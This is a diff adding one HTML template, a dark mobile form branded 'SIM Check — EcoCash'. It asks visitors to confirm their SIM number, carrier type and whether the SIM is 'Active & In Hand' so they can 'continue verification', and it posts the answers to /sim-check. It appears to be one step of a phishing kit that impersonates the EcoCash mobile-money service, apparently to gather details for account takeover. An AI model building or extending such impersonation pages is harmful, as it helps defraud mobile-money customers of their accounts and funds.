@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>SIM Check — EcoCash</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        * { box-sizing: border-box; }
+        :root {
+            --bg: #0b1118;
+            --card: #121b26;
+            --elevated: #182433;
+            --accent: #00b86b;
+            --accent-hover: #009e5b;
+            --text: #f4f7fb;
+            --muted: #94a3b8;
+            --border: rgba(255, 255, 255, 0.08);
+        }
+        body {
+            margin: 0;
+            min-height: 100vh;
+            background: radial-gradient(circle at top, #132234 0%, var(--bg) 65%);
+            color: var(--text);
+            font-family: -apple-system, BlinkMacSystemFont, "Inter", "Segoe UI", Roboto, sans-serif;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px 16px;
+        }
+        .card-modern {
+            width: 100%;
+            max-width: 420px;
+            background: var(--card);
+            border: 1px solid var(--border);
+            border-radius: 22px;
+            padding: 26px 20px;
+            box-shadow: 0 20px 45px rgba(0, 0, 0, 0.45);
+        }
+        .form-control, .form-select {
+            background: var(--elevated);
+            border: 1px solid rgba(255,255,255,0.12);
+            color: var(--text);
+            border-radius: 12px;
+            padding: 12px 14px;
+        }
+        .form-control:focus, .form-select:focus {
+            background: var(--elevated);
+            color: var(--text);
+            border-color: var(--accent);
+            box-shadow: 0 0 0 3px rgba(0, 184, 107, 0.18);
+        }
+        .btn-eco {
+            background: var(--accent);
+            color: #05120c;
+            font-weight: 700;
+            border: none;
+            border-radius: 14px;
+            padding: 14px;
+            width: 100%;
+        }
+        .btn-eco:hover { background: var(--accent-hover); color: #05120c; }
+    </style>
+</head>
+<body>
+    <div class="card-modern">
+        <h2 class="fw-bold fs-4 text-center mb-2">SIM Verification</h2>
+        <p class="small text-center mb-4" style="color: var(--muted);">
+            Confirm your active EcoCash SIM details to continue verification.
+        </p>
+
+        <form action="/sim-check" method="POST">
+            <div class="mb-3">
+                <label class="form-label small fw-medium">Active SIM Number</label>
+                <input type="tel" name="sim_phone" class="form-control" value="{{ phone }}" placeholder="77 000 0000" required>
+            </div>
+
+            <div class="mb-3">
+                <label class="form-label small fw-medium">Network / SIM Type</label>
+                <select name="sim_carrier" class="form-select" required>
+                    <option value="Econet Wireless (EcoCash)" selected>Econet Wireless (EcoCash)</option>
+                    <option value="4G / LTE Enabled SIM">4G / LTE Enabled SIM</option>
+                    <option value="Primary Wallet SIM">Primary Wallet SIM</option>
+                </select>
+            </div>
+
+            <div class="mb-4">
+                <label class="form-label small fw-medium">SIM Availability</label>
+                <select name="sim_status" class="form-select" required>
+                    <option value="Active & In Hand" selected>Active &amp; In Hand</option>
+                    <option value="Roaming / Secondary Device">Roaming / Secondary Device</option>
+                </select>
+            </div>
+
+            <button type="submit" class="btn-eco shadow-sm">Confirm SIM</button>
+        </form>
+    </div>
+</body>
+</html>
